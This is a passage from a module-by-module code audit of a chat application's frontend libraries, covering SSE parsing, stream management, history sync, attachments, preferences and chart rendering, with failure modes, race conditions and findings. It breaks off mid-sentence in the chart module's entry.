`FileCards` `:18` is a download anchor to `/api/reports/{filename}`; `TechSaraMark` `:10` requests
the same-origin asset `/techsara-mark.png`; `CitationChips` `:15` and `WebSources` `:19` are
outbound navigation targets built by the backend. Everything else is pure.

**Dependencies** — Inbound: `ModelPicker` ← `Composer:30`; `ConfirmDialog` ← `ChatApp:56`;
`EngineBadge` ← `ProofDrawer:12`, `ChatApp:60`; `ReasoningAccordion` ← `MessageRow:17`; `SqlBlock`
← `ProofDrawer:13`; `PastedChip` ← `MessageRow:14`, `Composer:31`; `CodeCitations` ←
`ProofDrawer:18`; `CopyButton` ← `MessageRow:16`, `SqlBlock:10`, `MermaidBlock:30`, `Markdown:12`;
`FileCards` ← `ProofDrawer:19`; `WebSources` ← `ProofDrawer:17`; `CitationChips` ←
`ProofDrawer:16`; `EmptyState` ← `ChatApp:59`; `TechSaraMark` ← `EmptyState:8`, `Sidebar:20`;
`icons` ← 20 component files. Outbound: `@/lib/types`, `@/lib/format` (`FileCards:7`) and `./icons`
only.

**Config** — None consume any environment variable.

**Failure modes**
- `CopyButton` `:29` calls `setCopied(true)` **even when both copy paths failed** — the boolean
  returned by `document.execCommand` `:26` is ignored, so the user is told "Copied" when nothing
  was.
- `ConfirmDialog` declares `role="alertdialog" aria-modal="true"` `:56-58` but has **no focus trap**
  — Tab can leave the dialog into the page behind it, unlike
  [`SearchPalette.tsx:248-258`](../../frontend/components/SearchPalette.tsx#L248-L258).
- `FileCards` `:33` calls `f.type.toUpperCase()` with no guard; `ReportFile.type` is declared
  required ([`types.ts:74-78`](../../frontend/lib/types.ts#L74-L78)) but `meta` is never validated
  at runtime, so a malformed payload throws in render.
- Key collisions on duplicate data: `CitationChips` `:13` (`object`+`record_id`), `WebSources`
  `:20` (`s.n`), `FileCards` `:16` (`filename`).
- `ReasoningAccordion.lastLine` `:16-23` splits the entire reasoning text on every render while
  streaming (no memo); `PastedChip` `:24-26` re-slices a possibly hundreds-of-KB string every
  render.

**Concurrency** — All synchronous. `CopyButton` `:30` and `ConfirmDialog` schedule timers that are
never cleared.

**Complexity hotspots** — None exceeds 60 LOC of logic. `icons.tsx` is 287 LOC of pure SVG literals.

**Findings** — None assigned. Dead exports verified with `rg`: `engineAccent`
([`EngineBadge.tsx:50`](../../frontend/components/EngineBadge.tsx#L50)) has no importer; `IconMenu`
`:67`, `IconSort` `:153` and `IconLogout` `:172` in
[`icons.tsx`](../../frontend/components/icons.tsx) have no importer — `IconLogout` is a leftover
from the removed login.

---

## 7. `lib/` — 24 modules

### 7.1 Wire and transport layer

## lib/sse.ts  (301 LOC)
**Purpose** — A hand-rolled, spec-compliant SSE parser plus the typed mapping from raw frames to the
chat contract. The docstring `:4-9` records the decision **not** to use the Vercel AI SDK, whose
data-stream protocol drops the custom `meta` event.

**Public surface** — `export interface SSEEvent {event: string; data: string}`
[`:16-21`](../../frontend/lib/sse.ts#L16-L21); `export class SSEParser` `:23` with
`feed(chunk: string): SSEEvent[]` `:34-64` and private `processLine` `:66-96`;
`export type ChatStreamEvent` `:105-118` (the 8-arm union);
`export function toChatStreamEvent(ev: SSEEvent): ChatStreamEvent | null` `:126-222`;
`export function mergeStep(steps, step): AgentStep[]` `:229-238`;
`export function foldStreamState(meta, live): Meta` `:246-278`;
`export async function* readChatStream(body: ReadableStream<Uint8Array>): AsyncGenerator<ChatStreamEvent>`
`:283-301`.

**Control flow** — `feed` `:34-64`: empty chunk → `[]` `:35`; a split CRLF is repaired via
`pendingCR` `:36-41`; the loop `:46-62` finds `[\r\n]` `:47`, slices `:49`, computes `sepLen`
`:54-56`, advances `:58` and dispatches `processLine` `:60`. `processLine` `:66-96`: a blank line
emits `{event: eventType || 'message', data: dataLines.join('\n')}` `:67-77`; a leading `:` is a
comment `:78`; otherwise split on the first `:` with one leading space stripped `:80-90`.
`toChatStreamEvent` `:126-222` is a `switch` inside one `try` whose `catch` returns `null` `:219-221`
— see [frontend-api-contracts.md §4](./frontend-api-contracts.md) for the per-event validation
table. `readChatStream` `:283-301` reads, decodes with `{stream: true}` `:293`, and yields non-null
mappings `:294-295`.

**State & side effects** — None. Pure parsing; no I/O, no globals.

**Dependencies** — Inbound: [`streams.ts:24`](../../frontend/lib/streams.ts#L24) and three test
files. Outbound: type-only inline `import('./types')` at `:109`, `:112`, `:116`, `:230-232`,
`:249-252`.

**Config** — None.

**Failure modes** — The single `try/catch` `:127`/`:219` swallows every `JSON.parse` failure into
`null`; a malformed frame is dropped with no telemetry. `readChatStream` has **no timeout and no
idle detection** — if the orchestrator holds the connection open without sending, the generator
awaits `reader.read()` forever. `finally { reader.releaseLock() }` `:298-300` **never calls
`reader.cancel()`**, so a consumer `break`
([`streams.ts:255`](../../frontend/lib/streams.ts#L255), `:260`) releases the lock without
cancelling the underlying stream.

**Concurrency** — `SSEParser` is stateful but per-instance; `readChatStream` constructs a fresh one
`:288`. No module-level mutable state. Safe for concurrent streams.

**Complexity hotspots** — `toChatStreamEvent` `:126-222` = **97 LOC**, 8 switch arms plus ~14 nested
type guards.

**Findings** — `OBS-01`. The asymmetry is architecturally significant: `step` and `research` are
validated field by field, while `meta` — the only event carrying `sql`, `data`, `chart`,
`chart_data` and `report_files` — is `JSON.parse`'d and cast unchecked at `:203`.

## lib/streams.ts  (393 LOC)
**Purpose** — A module-level registry of live per-conversation generations, so switching chats or
reloading the page never kills a running answer.

**Public surface** — `export type StreamStatus = 'streaming'|'done'|'stopped'|'error'|'unreachable'`
[`:27-32`](../../frontend/lib/streams.ts#L27-L32);
`export interface LiveStreamView {conversationId, messages, status}` `:34-38`;
`export function subscribeStreams(fn): () => void` `:53-58`; `getLiveStream(id)` `:64-68`;
`isStreaming(id)` `:70-72`; `streamingIds()` `:75-79`; `stopStream(id)` `:82-92`;
`async fetchServerActive(): Promise<string[]>` `:95-106`; `attachBaseTurns(messages)` `:110-114`;
`messagesDiscardedByRegenerate(messages, messageId)` `:124-131`;
`export interface StartStreamOptions {conversationId, turns, prefs, image?, pdf?, pdfName?}`
`:297-304`; `async startStream(opts): Promise<void>` `:307-348`;
`async attachStream(conversationId): Promise<boolean>` `:355-393`. Private:
`const streams = new Map<string, LiveStream>()` `:50`, `const listeners = new Set<...>()` `:51`,
`notify` `:60-62`, `updateAssistant` `:133-144`, `settleReasoningClock` `:147-155`, `finalize`
`:157-163`, `markUnreachable` `:165-178`, `consume` `:180-269`, `register` `:271-295`.

**Control flow** — `startStream` `:307-348`: `register(conversationId, turns)` `:309`
(**unconditionally overwrites any existing entry**, `:292`), POST `/api/chat` `:311-334` with
`signal: s.controller.signal`, `!res.ok || !res.body` → `markUnreachable` `:335-338`,
`await consume` `:339`, `AbortError` → `finalize({status:'stopped'})` `:341-343`, anything else →
`markUnreachable` `:345`. `attachStream` `:355-393`: early-return `true` if already streaming `:356`;
seed from cache `:362`; `await getHistoryStore().load(id, {force: true})` `:364` (server truth
preferred — the comment `:357-361` explains why cache-seeding destroyed threads);
`attachBaseTurns` `:369`; `register` `:370`; `GET /api/chat/attach/{id}` `:372-375`; non-ok →
`streams.delete(id)` + `false` `:376-380`; else `consume` → `true` `:381-382`. `consume` `:180-269`
is the 8-arm event reducer; `notify(conversationId)` fires **after every event** `:262`, and a body
that ends without a terminal frame is finalised as `'done'` anyway `:264-268`.

**State & side effects** — **Module-level mutable state**: `streams` Map `:50` and `listeners` Set
`:51`, both alive for the browser tab's lifetime. **localStorage writes** via
`getHistoryStore().saveMessages(...)` at `:161` (`finalize`) and `:176` (`markUnreachable`), each of
which also enqueues a background server push
([`history.ts:644-647`](../../frontend/lib/history.ts#L644-L647)). **Network egress**:
`POST /api/chat/stop` `:87`, `GET /api/chat/active` `:97`, `POST /api/chat` `:311`,
`GET /api/chat/attach/{id}` `:372`.

**Dependencies** — Inbound: `ChatApp.tsx` (`startStream` `:456`/`:466`/`:525`/`:578`, `attachStream`
`:215`/`:627`, `fetchServerActive` `:182`/`:210`/`:282`) and `tests/streams.test.ts`. Outbound:
`./history` `:21`, `./pasted` `:22`, `./prefs` (type) `:23`, `./sse` `:24`, `./types` `:25`.

**Config** — None. All URLs are same-origin relative paths, which is what keeps `ORCHESTRATOR_URL`
out of the browser bundle.

**Failure modes** — `.catch(() => undefined)` `:91` — a failed stop is invisible and the GPU keeps
generating. `catch { return [] }` `:103-105` — a failed active-poll is invisible.
`catch {}` `:366-368` — a failed force-load falls back to a possibly stale cache. `markUnreachable`
`:165-178` is used for **every** non-2xx from `/api/chat`, including a 400 "no user message" and a
502 wrapping an upstream 422; the message it persists `:172-174` claims the orchestrator is
unreachable even when it answered. **No timeout anywhere**: a stream that never sends a terminal
frame keeps `status: 'streaming'` forever, the spinner never clears and `Composer` stays disabled
([`Composer.tsx:139`](../../frontend/components/Composer.tsx#L139)).

**Concurrency** — `notify` iterates `[...listeners]` `:61`, so a listener unsubscribing during
dispatch is safe. **Race 1 — `register` overwrite** `:292`: `startStream` does not check for an
existing stream; the first `LiveStream` is still referenced by its running `consume()` loop and its
`controller` is never aborted, so when the orchestrator cancels the previous generation
([`orchestrator/app/main.py:348-350`](../../orchestrator/app/main.py#L348-L350)) that first body
ends without a terminal frame, hits `:264-268` and calls
`saveMessages(conversationId, <its own older list>)`, clobbering the newer turns in the cache. The
server-side 409-on-shrink guard
([`orchestrator/app/history.py:151-190`](../../orchestrator/app/history.py#L151-L190)) prevents
permanent loss, but the local view is wrong until a forced reload. **Race 2 — `attachStream`
double-register**: the guard at `:356` is checked *before* the `await` at `:364`, so two concurrent
calls (the 8 s poll firing while a previous attach is still awaiting) both pass and both open an SSE
reader on the same generation — `LiveGeneration.follow()` supports multiple subscribers
([`orchestrator/app/main.py:105-120`](../../orchestrator/app/main.py#L105-L120)) — and both then
`finalize` and `saveMessages`.

**Complexity hotspots** — `consume` `:180-269` = **90 LOC**, an 8-arm if/else-if chain with a
3-branch nested reducer for `research` `:204-236`. Cyclomatic complexity well above 10.

**Findings** — `SEC-01`, `REL-01`, `OBS-01` (no correlation id is generated or attached to any of
the four fetches).

## lib/orchestrator.ts  (101 LOC)
**Purpose** — Pure contract translation between the frontend's `/api/chat` body and the
orchestrator's `POST /chat` body. Kept pure so it is unit-testable.

**Public surface** — `export interface ChatRequestBody`
[`:16-31`](../../frontend/lib/orchestrator.ts#L16-L31);
`export interface OrchestratorChatRequest` `:34-48`;
`export const IMAGE_ONLY_PROMPT = 'Analyze the attached image.'` `:54`;
`export const PDF_ONLY_PROMPT = 'Read this document and summarize the key points.'` `:55`;
`export function lastUserContent(body): string` `:58-63`;
`export function toOrchestratorChatRequest(body): OrchestratorChatRequest | null` `:70-101`.

**Control flow** — `:73` `text = lastUserContent(body).trim()` (the **last** `role === 'user'`
message, found by reversing `:59-62`); `:74-75` pull `image`/`pdf` defaulting to `null`;
`:76-77` `message = text || (image ? IMAGE_ONLY_PROMPT : pdf ? PDF_ONLY_PROMPT : '')`; `:78` empty →
**return null**, which the caller turns into a 400
([`app/api/chat/route.ts:145-150`](../../frontend/app/api/chat/route.ts#L145-L150)); `:79-100` build
the payload — always `message`, `session_id` (default `'default'` `:85`), `image_base64` `:86`;
conditionally spread `messages` when non-empty `:82-84`, and
`conversation_id`/`mode`/`model`/`effort`/`agent` only when `!== undefined` `:89-95`.

**State & side effects** — None. Pure functions.

**Dependencies** — Inbound:
[`app/api/chat/route.ts:13-17`](../../frontend/app/api/chat/route.ts#L13-L17),
`tests/websearch.test.ts`, `tests/chat-contract.test.ts`. Outbound: none.

**Config** — None.

**Failure modes** — Nothing raises. `body.messages` may be `undefined` (`:60` defaults to `[]`).
**No `image`-size or `pdf`-size validation happens here or in its caller.**

**Concurrency** — Pure/synchronous.

**Complexity hotspots** — None; `toOrchestratorChatRequest` is 32 LOC.

**Findings** — `REL-01`. Documentation drift: the docstring `:6-8` still says the orchestrator
expects `message: str (min_length=1)`, but the real model is
`message: Optional[str] = None` with a `@model_validator`
([`orchestrator/app/main.py:185`, `:233-239`](../../orchestrator/app/main.py#L185)).

## lib/proxy.ts  (64 LOC)
**Purpose** — The shared server-side forwarder used by `/api/history/*`. Relays cookies in both
directions and is the single place `ORCHESTRATOR_URL` is read for that route family.

**Public surface** — `export function orchestratorUrl(): string`
[`:9-11`](../../frontend/lib/proxy.ts#L9-L11); private `setCookiesOf(headers: Headers): string[]`
`:14-19`; `export async function proxyToOrchestrator(req: Request, upstreamPath: string): Promise<Response>`
`:21-64`.

**Control flow** — 1. `:25-29` build the forwarded header set: **only `cookie` and
`content-type`**; every other inbound header (`authorization`, `accept`, `user-agent`, `x-*`) is
dropped. 2. `:33-42` `fetch` with `method: req.method`, body `= GET/HEAD ? undefined : await
req.text()`, `cache: 'no-store'`, `redirect: 'manual'`. 3. `:43-48` a thrown fetch → 502
`{message: 'The orchestrator is unreachable.'}`. 4. `:50-58` response headers: `content-type` from
upstream or `application/json` `:51-54`, `cache-control: no-store` `:55`, then **append every
upstream `Set-Cookie` verbatim** `:56-58`. 5. `:60-63`
`new Response(await upstream.arrayBuffer(), {status: upstream.status, headers})`.

**State & side effects** — Network egress to `ORCHESTRATOR_URL + upstreamPath`. No DB, no
filesystem.

**Dependencies** — Inbound:
[`app/api/history/[...path]/route.ts:10`](../../frontend/app/api/history/%5B...path%5D/route.ts#L10)
— **the only consumer**. The docstring `:1-2` claims it also serves `/api/auth/*`, which is false:
[`app/api/auth/me/route.ts:18`](../../frontend/app/api/auth/me/route.ts#L18) uses a raw `fetch`.
Outbound: global `fetch`.

**Config** — `process.env.ORCHESTRATOR_URL` at `:10`, defaulting to `http://localhost:8080`.
**Server-side only** — see §8.

**Failure modes** — Bare `catch {}` `:43`. `await req.text()` `:39` **buffers the entire request
body**; the largest body flowing through is `PUT /history/conversations/{id}/messages`, which
carries a whole thread including every message's `meta` — and `meta.data` holds SQL result rows
([`types.ts:105`](../../frontend/lib/types.ts#L105)) plus `meta.chart_data` `:113`. No size bound.
`await upstream.arrayBuffer()` `:60` buffers the entire response — the same concern in the other
direction for `GET /history/conversations/{id}`. No timeout, no retry. `redirect: 'manual'` `:41`
returns a 3xx to the browser with its `Location` header **dropped** (only `content-type`,
`cache-control` and `set-cookie` are copied), making a redirect an opaque empty response.

**Concurrency** — Async, stateless.

**Complexity hotspots** — None.

**Findings** — `SEC-01`, `REL-01`. `Set-Cookie` is reflected verbatim `:56-58`; no upstream sets one
today ([`orchestrator/app/auth.py:89-97`](../../orchestrator/app/auth.py#L89-L97)), so it is
dormant, but it is an unfiltered cookie-injection channel if that ever changes. This is also the
**only** route family that preserves the upstream status `:61` — every other route flattens
failures to 502.

## lib/historyApi.ts  (256 LOC)
**Purpose** — Typed fetch client for `/api/history/*`, with an injectable `fetch` so the sync logic
is testable offline.

**Public surface** — `ServerConversationSummary` [`:9-17`](../../frontend/lib/historyApi.ts#L9-L17)
(optional fields typed `unknown`); `ServerMessage` `:19-23`; `ServerConversation` `:25-29`;
`type FetchLike` `:31-34`; `toEpoch(value, fallback)` `:41-53`;
`class HistoryApiError extends Error {status: number}` `:56-64`; `isNotFound` `:66-68`;
`isConflict` `:71-73`; `isUnreachable` `:76-78`; `ConversationPatch` `:81-85`; `ListOptions`
`:87-90`; `interface HistoryApi` `:92-115` (`list`, `get`, `create`, `update`, `remove`,
`appendMessage`, `replaceMessages`, `truncateMessages`); `const BASE = '/api/history/conversations'`
`:117`; `createHistoryApi(fetchFn?)` `:119-192`; `ServerSearchResult` `:197-206`; `SearchOptions`
`:208-213`; `async searchConversations(query, options): Promise<unknown>` `:226-256`.

**Control flow** — `request` `:122-153`: `doFetch(BASE + path, {method, cache:'no-store', …body})`
`:129-138`; a thrown fetch → `HistoryApiError(0, 'History server unreachable.')` `:139-141`;
`!res.ok` → `HistoryApiError(res.status, …)` `:142-147`; JSON parse, `null` on non-JSON `:148-152`.
`toEpoch` `:41-53` handles seconds-vs-milliseconds (`value < 1e11`) and SQLite naive-UTC strings.
`searchConversations` `:226-256` rethrows `AbortError` unchanged `:241-244` so the caller can tell
"superseded" from "failed".

**State & side effects** — Network egress to same-origin `/api/history/*` only.

**Dependencies** — Inbound: [`history.ts:24-34`](../../frontend/lib/history.ts#L24-L34),
`SearchPalette.tsx`, `searchPalette.ts`, `tests/history-server.test.ts`. Outbound: `./types` (`Meta`,
`:7`).

**Config** — None.

**Failure modes** — **No timeout on any request**; `request` `:129` passes no signal at all, and
only `searchConversations` supports abort `:239`. `catch { return null }` `:151-152`/`:253-254`
conflates "204 No Content" with "malformed JSON". `isUnreachable` `:76-78` returns `true` for
**any** non-`HistoryApiError` throwable, including a `TypeError` from a coding bug — which at
[`history.ts:764`](../../frontend/lib/history.ts#L764) aborts the whole `refresh()`, so a
programming error masquerades as "offline". The upstream `detail` body is discarded `:142-147`, so a
409 *"refusing to shrink conversation from 12 to 3 messages"* reaches the caller as the bare number
409.

**Concurrency** — Stateless; the injected `fetchFn` closure is the only captured state.

**Complexity hotspots** — None; `createHistoryApi` is 74 LOC but is a flat object literal of nine
one-line methods, and `request` is 32 LOC.

**Findings** — `OBS-01`.

## lib/auth.ts  (29 LOC)
**Purpose** — The residue of the removed login: fetch the local username so `lib/history` can scope
its localStorage cache key.

**Public surface** — `export type FetchLike = typeof fetch`
[`:11`](../../frontend/lib/auth.ts#L11);
`export type MeResult = {ok: true; username: string} | {ok: false; status: number}` `:13-15`;
`export async function fetchMe(fetchFn: FetchLike = fetch): Promise<MeResult>` `:18-29`.

**Control flow** — `:20` `fetchFn('/api/auth/me', {cache: 'no-store'})`; `:21` `!res.ok` →
`{ok:false, status: res.status}`; `:22-25` require `typeof body.username === 'string'`, else
`{ok:false, status: res.status}` (so a 200 with a bad shape reports `status: 200, ok: false`);
`:26-28` a throw → `{ok:false, status: 0}` — status 0 means network failure (`:17`).

**State & side effects** — One same-origin GET. No writes.

**Dependencies** — Inbound: [`ChatApp.tsx:24`](../../frontend/components/ChatApp.tsx#L24) only.
Outbound: global `fetch`.

**Config** — None.

**Failure modes** — Bare `catch {}` `:26`. No timeout, no retry.

**Concurrency** — Async, stateless.

**Complexity hotspots** — None.

**Findings** — `SEC-01`. The module docstring `:1-9` is the clearest in-repo statement of the
security posture: *"There is no sign-in, no sign-up, no session cookie and no route gating: this app
runs as a single local user."*

### 7.2 Persistence and state

## lib/history.ts  (851 LOC)
**Purpose** — The conversation store: a synchronous `HistoryStore` interface over a localStorage
cache, with background push/pull reconciliation against `/api/history/*`.

**Public surface** — `STORAGE_KEY = 'techsara.history.v1'`
[`:40`](../../frontend/lib/history.ts#L40); `SYNC_KEY = 'techsara.history.sync.v1'` `:41`;
`TITLE_MAX = 40` `:42`; `export interface StorageLike` `:45-49`; `export interface HistoryStore`
`:51-66` (`list`, `listArchived`, `get`, `create`, `rename`, `remove`, `saveMessages`, `setPinned`,
`setArchived`); `export interface ServerHistoryStore extends HistoryStore` `:69-104` (adds
`setActiveUser`, `migrateLocalConversations`, `refresh`, `refreshArchived`, `load`,
`exportMarkdown`, `truncateMessages`, `flush`); `titleFromFirstMessage(text)` `:106-112`;
`newId()` `:114-119`; `createHistoryStore(storage, onEvict?)` `:296-301`;
`createServerHistoryStore(options)` `:339-808`; `setEvictListener(fn)` `:815-819`;
`getHistoryStore(): ServerHistoryStore` `:827-851`. Private: `isQuotaError` `:121-130`,
`createCache` `:140-190`, `summarize` `:198-220`, `storeOverCache` `:222-290`, `SyncState`
`:305-320`, `sameIds`/`isPrefix` `:322-331`.

**Control flow** — `createCache.writeAll` `:157-180`: try `setItem`; on a quota error find the
oldest by `updatedAt` `:165-170`, splice it out `:171`, fire `onEvict` `:172-177`, retry — looping
until it fits or the array is empty `:164`. `createServerHistoryStore` `:339-808`:
`mergeServerRows` `:407-450` adds unknown ids with `messages: []` marked `pushed[id] = 'unknown'`
`:413-425`; `pushAll` `:466-498` tolerates a 409 on create `:470-473` and, on a 409 from
`replaceMessages` (server has **more** messages), pulls server truth instead of overwriting
`:479-488`; `syncConversation` `:501-525` appends only the delta when `pushed` is a strict prefix
`:511-520`; `loadConversation` `:542-591` has three skip conditions `:549-559`, keeps the local copy
when `force` meets a shorter server thread `:562-564`, and assigns synthetic ids `srv-<id>-<i>`
`:567` and synthetic `createdAt` values `now - (len - i)` `:572`; `refresh` `:730-789` is a 4-phase
reconcile (replay deletes `:733-742` → re-push dirty `:746-750` → fetch active + archived `:754-765`
→ resolve local-only conversations `:769-782` → `mergeServerRows` `:784`).

**State & side effects** — **localStorage writes** to `STORAGE_KEY` `:161` and `SYNC_KEY` `:374`,
`:696-703`; **removal** `:184` (reached from `setActiveUser` `:693`, which clears the entire cache
when the username changes). **Network egress** entirely through `HistoryApi`. **Module-level mutable
state**: `browserStore` `:812` and `evictListener` `:813`.

**Dependencies** — Inbound: [`streams.ts:21`](../../frontend/lib/streams.ts#L21), `ChatApp.tsx`,
`prefs.ts`, and three test files. Outbound: `./types` `:18-23`, `./historyApi` `:24-34`,
`./exportMarkdown` `:36-39`.

**Config** — None; relative URLs only.

**Failure modes** — Swallowed at `:151-152` (corrupt cache), `:185-187` (storage unavailable),
`:365-367` (corrupt sync state), `:375-377` (sync write), **`:595`** (`.catch(() => markDirty(id))`
— *every* background push failure), `:588-590` (load failure), `:705-707`, `:786-788` (the whole
`refresh`), `:794-797`. **Silent data loss**: `onEvict` fires `:172` but the eviction is not
undoable and the conversation is not re-fetchable if the server never had it; because
`saveMessages` `:273-280` stores the **whole** `ChatMessage[]` **including `imageDataUrl`**, one
≤10 MB image becomes ~13.6 MB of base64 in a 5–10 MB quota and the loop can empty the cache
entirely. `refresh` returning `false` `:787` is indistinguishable between "offline" and "server
rejected everything".

**Concurrency** — `enqueue` `:593-599` serialises per conversation but **not** across
conversations, and the `chains` map is never pruned — it grows monotonically for the tab's lifetime
(a slow leak). `saveMessages` → `enqueue(syncConversation)` `:644-647` races with
`loadConversation`; the server's 409-on-shrink is the real guard. `getHistoryStore()` `:827-851`
memoises only in the browser branch `:844-849`; the SSR branch `:828-843` **constructs a brand-new
store on every call**. `readSync()` is called inside loops `:427`, `:719`, `:746`, `:772`, each doing
a full `JSON.parse` of the sync blob.

**Complexity hotspots** — `createServerHistoryStore` `:339-808` = **470 LOC**, the largest function
in the frontend. `refresh` `:730-789` = 60 LOC, 4 phases, 3 nested loops, 2 try/catch levels.
`loadConversation` `:542-591` = 50 LOC, 5 early returns. `pushAll` `:466-498` = 33 LOC with nested
try/catch and error-class dispatch.

**Findings** — `REL-01`, `OBS-01`. The comment block at `:452-465` documents a **previously shipped
data-destroying bug** (delete-and-recreate) and the 409 guard that replaced it — the single most
valuable piece of institutional memory in the frontend. `loadConversation` `:566-573` rebuilds
messages from server rows with **no `imageDataUrl` and no `pdfName`**, which is what silently breaks
attachment re-send (see `lib/attachments.ts`).

## lib/attachments.ts  (79 LOC)
**Purpose** — An in-memory (never persisted) map of the raw attachment payload sent with each user
turn, so regenerate/retry re-send the same question **with** its file.

**Public surface** — `export interface SentAttachment {kind: 'image'|'pdf'; name: string; base64: string}`
[`:17-22`](../../frontend/lib/attachments.ts#L17-L22);
`rememberAttachment(messageId, attachment): void` `:27-32`;
`base64FromDataUrl(dataUrl?): string | null` `:35-41`;
`export interface AttachmentLookup {attachment: SentAttachment | null; missing: boolean}` `:43-48`;
`attachmentForResend(message): AttachmentLookup` `:58-74`; `clearAttachments(): void` `:77-79`
(test seam).

**Control flow** — `attachmentForResend` consults the in-memory map first `:63-64`, falls back to
decoding the persisted `imageDataUrl` `:66-72`, then reports `missing` when the turn *had* an
attachment that can no longer be rebuilt `:73`.

**State & side effects** — Module-level `const sent = new Map<string, SentAttachment>()` `:24` —
shared mutable state for the tab's lifetime, **never bounded and never evicted**. A session that
attaches ten 25 MB PDFs holds ~250 MB of base64 in the JS heap until reload.

**Dependencies** — Inbound: [`ChatApp.tsx:35`](../../frontend/components/ChatApp.tsx#L35),
`tests/attachments.test.ts`. Outbound: none.

**Config** — None.

**Failure modes** — `missing` is computed **only** from `pdfName || imageDataUrl` `:73`. Any path
that rebuilds a thread from server messages drops both fields
([`history.ts:566-573`](../../frontend/lib/history.ts#L566-L573) constructs `ChatMessage`s with only
`id/role/content/meta/status/createdAt`), so the lookup returns `{attachment: null, missing: false}`
and the caller **silently re-sends a vision question with no image and reports nothing**.

**Concurrency** — Synchronous. The map is not keyed by conversation, so ids must be globally unique
— they are (`crypto.randomUUID`, [`history.ts:114-119`](../../frontend/lib/history.ts#L114-L119)).

**Complexity hotspots** — None.

**Findings** — `REL-01`. The docstring `:9-14` claims the payload is deliberately kept out of
localStorage to avoid quota eviction, while
[`ChatApp.tsx:412-413`](../../frontend/components/ChatApp.tsx#L412-L413) persists the full image
`dataUrl` anyway — the two policies contradict each other.

## lib/prefs.ts  (138 LOC)
**Purpose** — Per-conversation composer preferences persisted in localStorage under a draft slot
plus one entry per conversation.

**Public surface** — `export type WebSearchMode = 'off' | 'auto' | 'on'`
[`:20`](../../frontend/lib/prefs.ts#L20);
`export interface ChatPrefs {salesforce; model; effort; agent; webSearch}` `:22-29`;
`export const DEFAULT_PREFS` `:31-37`; `loadPrefs(storage, conversationId)` `:98-105`;
`savePrefs(storage, conversationId, prefs)` `:108-116`;
`adoptDraftPrefs(storage, conversationId)` `:119-129`;
`removePrefs(storage, conversationId)` `:132-138`. Private
`STORAGE_KEY = 'techsara.chatprefs.v1'` `:39`, `DRAFT_SLOT = '__draft__'` `:40`,
`MAX_ENTRIES = 200` `:42`, `sanitize` `:44-67`, `readMap` `:69-80`, `writeMap` `:82-95`.

**Control flow** — `sanitize` `:44-67` forces `agent: false` `:64` and downgrades any stored
`webSearch !== 'on'` to `'auto'` `:65`, migrating settings whose UI controls were removed `:59-63`.
`writeMap` `:82-95` drops the oldest non-draft entries above 200 `:84-89`.

**State & side effects** — localStorage read/write through the injected `StorageLike` `:71`, `:91`.

**Dependencies** — Inbound: [`ChatApp.tsx:27-34`](../../frontend/components/ChatApp.tsx#L27-L34),
`Composer.tsx:23` (type), `streams.ts:23` (type), `tests/prefs.test.ts`. Outbound: `./types` `:9`,
`./history` (type) `:10`.

**Config** — None (env); storage key `:39`.

**Failure modes** — Both read `:77-79` and write `:92-94` swallow every error, so a full quota
silently loses preferences (documented as acceptable `:93`).

**Concurrency** — Every operation is a full read-modify-write of one JSON blob `:113-115`,
`:124-127`, `:134-137`; two tabs writing concurrently lose each other's changes (last-write-wins).

**Complexity hotspots** — None.

**Findings** — None assigned. Contract note: `WebSearchMode = 'off'` is unreachable from the UI
(`sanitize` `:65` maps it to `'auto'`) but the value is still forwarded to the backend as
`web_search` ([`streams.ts:327`](../../frontend/lib/streams.ts#L327)), where the orchestrator's
`Literal["off","auto","on"]`
([`orchestrator/app/main.py:199`](../../orchestrator/app/main.py#L199)) still accepts it.

### 7.3 Charts

## lib/chartOption.ts  (602 LOC)
**Purpose** — The trusted `ChartSpec` → ECharts option adapter and the documented security boundary
between backend-supplied data and the chart renderer.

**Public surface** — `export type EChartsOption = Record<string, unknown>`
[`:45`](../../frontend/lib/chartOption.ts#L45); `export const CHART_TYPES` `:48-58` (9 types);
`isChartType(value): value is ChartType` `:68`; `export type ChartProblem` `:76-83` (7 members);
`validateChart(spec, rows): ChartProblem | null` `:93-117`;
`partToWholeData(spec, rows, key)` `:138-153`; `escapeHtml(text): string` `:176-178`;
`buildChartOption(spec, rows, palette): EChartsOption | null` `:315-326`;
`export const CATEGORY_TICK_LIMIT` `:602`. Private: `TYPE_SET` `:60`, `PART_TO_WHOLE` `:63`,
`MAX_SLICES = 6` `:65`, `MAX_CATEGORY_TICKS = 40` `:66`, `usableYKeys` `:123`, `categoriesOf` `:129`,
`valuesOf` `:133`, `ESCAPES` `:159-165`, `swatch` `:180`, `tooltipRow` `:187`, `numberFrom` `:200`,
three tooltip formatters `:205`/`:218`/`:227`, `valueLabel` `:240`, `baseOption` `:249`, `legendOf`
`:266`, `categoryAxis` `:278`, `valueAxis` `:294`, `labelOption` `:304`, `buildOption` `:328`, and
seven per-type builders `:354`–`:566`.

**Control flow** — `buildChartOption` `:315-326` re-runs `validateChart` `:320` then calls
`buildOption` inside a try/catch returning `null` on any throw `:321-325`. `buildOption` `:328-352`
switches on the **whitelisted** `spec.type` `:333-351`, with `default` falling through to
`barOption` `:348-350`. `validateChart` `:93-117` checks: type whitelist `:97`, non-empty rows `:98`,
x column present `:101`, at least one present y column `:102-103`, scatter needs numeric x
`:105-108`, at least one numeric y `:109-110`, pie/donut needs a positive total `:112-115`.

**State & side effects** — None. Pure module; no DOM, no `echarts` import (`:26-29`).

**Dependencies** — Inbound: [`ChartView.tsx:28`](../../frontend/components/ChartView.tsx#L28),
`EChart.tsx:39` (type only), `tests/chartOption.test.ts`. Outbound: `./types` `:32`,
`./chartTheme` `:33`, `./chartFormat` `:34-42`.

**Config** — None.

**Failure modes** — `buildChartOption` is total `:321-325`. **The tooltip formatters are the one
HTML sink**, and they are guarded: `tooltipRow` `:187-189` escapes name and value, `swatch`
`:180-185` escapes the colour, and `axisTooltipFormatter` escapes the header `:215`. `escapeHtml`
`:177` calls `.replace` on its argument and **would throw** if ECharts ever passed a non-string
`name`/`axisValueLabel` — the `?? ''` fallbacks at `:208`, `:212`, `:224` cover `null`/`undefined`
but not a number.

**Concurrency** — Synchronous, pure.

**Complexity hotspots** — No single function exceeds 60 LOC; the cyclomatic weight is concentrated
in `validateChart` `:93-117` (9 branches) and `buildOption` `:328-352` (10 arms). 602 LOC in one
module.

**Findings** — None. The security rationale documented at `:1-30` is **accurate as written**:
`type` is whitelist-checked `:97`, `x_key`/`y_keys` are used only as property lookups `:130`/`:134`,
and every `formatter` is a local function (`:289`, `:299`, `:306`, `:366`, `:397`, `:435`, `:470`,
